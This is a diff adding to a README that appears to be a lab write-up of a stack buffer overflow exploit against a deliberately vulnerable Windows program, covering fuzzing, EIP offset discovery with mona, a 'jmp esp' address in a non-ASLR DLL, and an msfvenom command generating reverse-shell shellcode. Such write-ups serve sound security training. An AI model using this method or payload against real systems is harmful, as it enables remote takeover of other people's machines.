@@ -50,3 +50,20 @@ I set up Windows 7(,XP) on virtualbox, ran the program on Immunity Debugger, and
 I tested the program by entering a number of As.  
 ![alt text](./images/As.png?raw=true)  
 ![alt text](./images/registers?raw=true)  
+
+Fuzzing ended with sending around 2000 bytes.  
+Then, I sent a cyclic pattern created by pattern_create.rb and analyzed the memory using mona to find RIP offset.  
+![alt text](./images/patterns_mona.png?raw=true)  
+I checked bad characters were detected, but none of \x01 ~ \xff was bad chars.  
+
+Now that we know the EIP offset, we need to find out which address we'll store in EIP.  
+By executing the following mona command on Immunity Debugger, I found essfunc.dll doesn't enable ASLR.  
+![alt text](./images/ASLR.png?raw=true)  
+Therefore, the address where "jump esp" instructions are located in essfunc.dll is the one we need to store in EIP.  
+Modifying exploit.py so it contains the address of "jump esp" and the shellcode generated using msfvenom by the following command,  
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=$MYIP LPORT=4444 EXITFUNC=thread -b "\x00" -f c  
+```
+
+Then, I ran ```python3 exploit.py```, I got reverse shell with admin privilege.  
+
